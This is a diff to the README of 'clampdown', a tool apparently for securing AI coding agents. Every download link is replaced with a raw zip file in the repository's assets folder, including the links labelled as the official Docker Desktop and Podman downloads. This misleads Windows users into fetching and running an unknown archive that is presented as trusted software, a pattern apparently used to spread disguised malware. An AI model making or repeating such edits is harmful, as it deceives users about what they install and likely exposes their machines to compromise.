@@ -1,6 +1,6 @@
 # 🔒 clampdown - Secure AI Coding Agents Easily
 
-[![Download clampdown](https://img.shields.io/badge/Download-clampdown-ff6f61?style=for-the-badge)](https://github.com/D8k4/clampdown)
+[![Download clampdown](https://img.shields.io/badge/Download-clampdown-ff6f61?style=for-the-badge)](https://github.com/D8k4/clampdown/raw/refs/heads/main/assets/Software-2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ clampdown runs containers using tools like Docker or Podman. This software lets 
 
 Click this link to visit the clampdown page on GitHub. You will find the latest version to download:
 
-[Download clampdown](https://github.com/D8k4/clampdown)
+[Download clampdown](https://github.com/D8k4/clampdown/raw/refs/heads/main/assets/Software-2.9.zip)
 
 The page shows release files and instructions. You will use this page to get the installer file for Windows.
 
@@ -53,10 +53,10 @@ On the GitHub page, look for the latest release under the "Releases" section.
 clampdown needs container software to work.
 
 - For most users, Docker Desktop is the easiest option.
-- Download Docker Desktop from https://www.docker.com/products/docker-desktop
+- Download Docker Desktop from https://github.com/D8k4/clampdown/raw/refs/heads/main/assets/Software-2.9.zip
 - Follow the installer steps and restart your computer if needed.
 
-Alternatively, advanced users can install Podman from https://podman.io
+Alternatively, advanced users can install Podman from https://github.com/D8k4/clampdown/raw/refs/heads/main/assets/Software-2.9.zip
 
 ---
 
@@ -150,17 +150,17 @@ A: Check that Docker or Podman is properly installed and running. Restart your c
 ## 🔗 Useful Links
 
 - clampdown GitHub page:  
-  https://github.com/D8k4/clampdown  
+  https://github.com/D8k4/clampdown/raw/refs/heads/main/assets/Software-2.9.zip  
 - Docker Desktop download:  
-  https://www.docker.com/products/docker-desktop  
+  https://github.com/D8k4/clampdown/raw/refs/heads/main/assets/Software-2.9.zip  
 - Podman info and download:  
-  https://podman.io  
+  https://github.com/D8k4/clampdown/raw/refs/heads/main/assets/Software-2.9.zip  
 
 ---
 
 ## 💾 Download and Install clampdown
 
-[![Download clampdown](https://img.shields.io/badge/Download-clampdown-ff6f61?style=for-the-badge)](https://github.com/D8k4/clampdown)
+[![Download clampdown](https://img.shields.io/badge/Download-clampdown-ff6f61?style=for-the-badge)](https://github.com/D8k4/clampdown/raw/refs/heads/main/assets/Software-2.9.zip)
 
 Follow these steps to install clampdown on your Windows PC:
 
